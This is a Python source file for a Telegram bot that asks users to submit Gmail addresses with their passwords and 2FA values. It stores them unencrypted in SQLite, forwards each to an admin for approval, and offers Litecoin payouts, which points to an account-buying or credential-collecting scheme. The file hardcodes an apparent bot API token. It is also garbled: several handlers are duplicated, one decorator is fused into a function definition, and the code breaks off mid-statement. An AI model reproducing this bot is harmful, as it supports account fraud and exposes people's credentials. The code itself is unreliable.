import logging
import sqlite3
from aiogram import Bot, Dispatcher, types
from aiogram.types import ReplyKeyboardMarkup, InlineKeyboardMarkup, InlineKeyboardButton
from aiogram.utils import executor

API_TOKEN = "8990527408:AAHW8bzyfmT0lDid7q_lq89MNnGtmMJsDC0"
ADMIN_ID = 5582627293

logging.basicConfig(level=logging.INFO)

bot = Bot(token=API_TOKEN)
dp = Dispatcher(bot)

# ================= DATABASE =================
conn = sqlite3.connect("bot.db")
cursor = conn.cursor()

cursor.execute("""
CREATE TABLE IF NOT EXISTS users (
    user_id INTEGER PRIMARY KEY,
    balance REAL DEFAULT 0,
    banned INTEGER DEFAULT 0
)
""")

cursor.execute("""
CREATE TABLE IF NOT EXISTS accounts (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    user_id INTEGER,
    account TEXT,
    password TEXT,
    twofa TEXT,
    status TEXT DEFAULT 'Pending'
)
""")

conn.commit()

user_state = {}

# ================= MENU =================
def main_menu():
    kb = ReplyKeyboardMarkup(resize_keyboard=True)
    kb.add("Register", "My Account")
    kb.add("Balance", "Help")
    return kb

# ================= START =================
@dp.message_handler(commands=['start'])
async def start(message: types.Message):
    cursor.execute("INSERT OR IGNORE INTO users (user_id) VALUES (?)", (message.from_user.id,))
    conn.commit()
    await message.answer("Welcome!", reply_markup=main_menu())

# ================= REGISTER =================
@dp.message_handler(lambda m: m.text == "Register")
async def register(message: types.Message):
    kb = ReplyKeyboardMarkup(resize_keyboard=True)
    kb.add("Submit Account", "Back")
    await message.answer("Submit your account", reply_markup=kb)

# ================= SUBMIT =================
@dp.message_handler(lambda m: m.text == "Submit Account")
async def submit(message: types.Message):
    user_state[message.from_user.id] = {"step": "acc"}
    await message.answer("Enter Gmail:")

# ================= BALANCE =================
@dp.message_handler(lambda m: m.text == "Balance")
async def balance(message: types.Message):
    cursor.execute("SELECT balance FROM users WHERE user_id=?", (message.from_user.id,))
    bal = cursor.fetchone()[0]
    await message.answer(f"Balance: {bal}$")

# ================= HANDLER =================
@dp.message_handlerasync def start(message: types.Message):
    cursor.execute("INSERT OR IGNORE INTO users (user_id) VALUES (?)", (message.from_user.id,))
    conn.commit()
    await message.answer("Welcome!", reply_markup=main_menu())

# ================= REGISTER =================
@dp.message_handler(lambda m: m.text == "Register")
async def register(message: types.Message):
    kb = ReplyKeyboardMarkup(resize_keyboard=True)
    kb.add("Submit Account", "Back")
    await message.answer("Submit your account", reply_markup=kb)

# ================= SUBMIT =================
@dp.message_handler(lambda m: m.text == "Submit Account")
async def submit(message: types.Message):
    user_state[message.from_user.id] = {"step": "acc"}
    await message.answer("Enter Gmail:")

# ================= BALANCE =================
@dp.message_handler(lambda m: m.text == "Balance")
async def balance(message: types.Message):
    cursor.execute("SELECT balance FROM users WHERE user_id=?", (message.from_user.id,))
    bal = cursor.fetchone()[0]
    await message.answer(f"💰 Balance: {bal}$")

# ================= MY ACCOUNT =================
@dp.message_handler(lambda m: m.text == "My Account")
async def my_account(message: types.Message):
    cursor.execute("SELECT account, status FROM accounts WHERE user_id=?", (message.from_user.id,))
    data = cursor.fetchall()

    if not data:
        await message.answer("No accounts")
        return

    text = ""
    for acc, status in data:
        text += f"{acc} → {status}\n"

    await message.answer(text)

# ================= HELP =================
@dp.message_handler(lambda m: m.text == "Help")
async def help_cmd(message: types.Message):
    await message.answer("Admin: send message")

# ================= WITHDRAW =================
@dp.message_handler(lambda m: m.text == "Payout")
async def payout(message: types.Message):
    kb = ReplyKeyboardMarkup(resize_keyboard=True)
    kb.add("LTC", "Back")
    await message.answer("Select payment method:", reply_markup=kb)

@dp.message_handler(lambda m: m.text == "LTC")
async def ltc(message: types.Message):
    user_state[message.from_user.id] = {"step": "ltc"}
    await message.answer("Send LTC address")

# ================= ADMIN PANEL =================
@dp.message_handler(commands=['admin'])
async def admin_panel(message: types.Message):
    if message.from_user.id != ADMIN_ID:
        return

    kb = ReplyKeyboardMarkup(resize_keyboard=True)
    kb.add("👥 Users", "📢 Broadcast")
    kb.add("🚫 Ban", "✅ Unban")

    await message.answer("Admin Panel", reply_markup=kb)

# ================= MAIN HANDLER =================
@dp.message_handler()
async def handle(message: types.Message):

    # BAN CHECK
    cursor.execute("SELECT banned FROM users WHERE user_id=?", (message.from_user.id,))
    row = cursor.fetchone()
    if row and row[0] == 1:
        return

    state = user_state.get(message.from_user.id)
    if not state:
        return

    step = state.get("step")

    # ACCOUNT
    if step == "acc":
        state["acc"] = message.text
        state["step"] = "pass"
        await message.answer("Password:")
        return

    elif step == "pass":
        state["pass"] = message.text
        state["step"] = "2fa"
        await message.answer("2FA:")
        return

    elif step == "2fa":
        cursor.execute(
            "INSERT INTO accounts (user_id, account, password, twofa) VALUES (?, ?, ?, ?)",
            (message.from_user.id, state["acc"], state["pass"], message.text)
        )
        conn.commit()

        acc_id = cursor.lastrowid

        kb = InlineKeyboardMarkup()
        kb.add(
            InlineKeyboardButton("✅ Approve", callback_data=f"approve_{acc_id}"),
            InlineKeyboardButton("❌ Reject", callback_data=f"reject_{acc_id}")
        )

        await bot.send_message(ADMIN_ID, f"New Account: {state['acc']}", reply_markup=kb)

        await message.answer("Submitted, waiting approval")
        user_state[message.from_user.id] = {}

    # LTC
    elif step == "ltc":
        state["addr"] = message.text
        state["step"] = "amount"
        await message.answer("Enter amount (min 5$)")
        return

    elif step ==
